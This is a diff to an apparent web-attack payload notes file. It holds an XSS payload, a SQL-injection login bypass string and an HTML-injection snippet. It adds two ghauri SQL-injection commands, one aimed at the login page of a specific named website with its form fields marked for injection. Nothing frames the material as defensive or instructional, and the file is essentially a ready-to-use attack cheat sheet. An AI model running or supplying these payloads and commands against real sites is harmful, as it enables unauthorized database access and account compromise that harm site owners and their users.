@@ -1,6 +1,9 @@
 "><svg/onload=confirm(1)>"@x
 'or 1=1 limit 1-- -
 
+ghauri -u "https://omnibookslibrary.com/login.php" --data="mobile=*&password=pass&login=" --batch --flush-session
+ghauri -r req.txt --batch --flush-session --level 3
+
 >> https://x.com/brutelogic?mx=2
 
 '"()><img src="x"><a href="https://google.com">click</a>
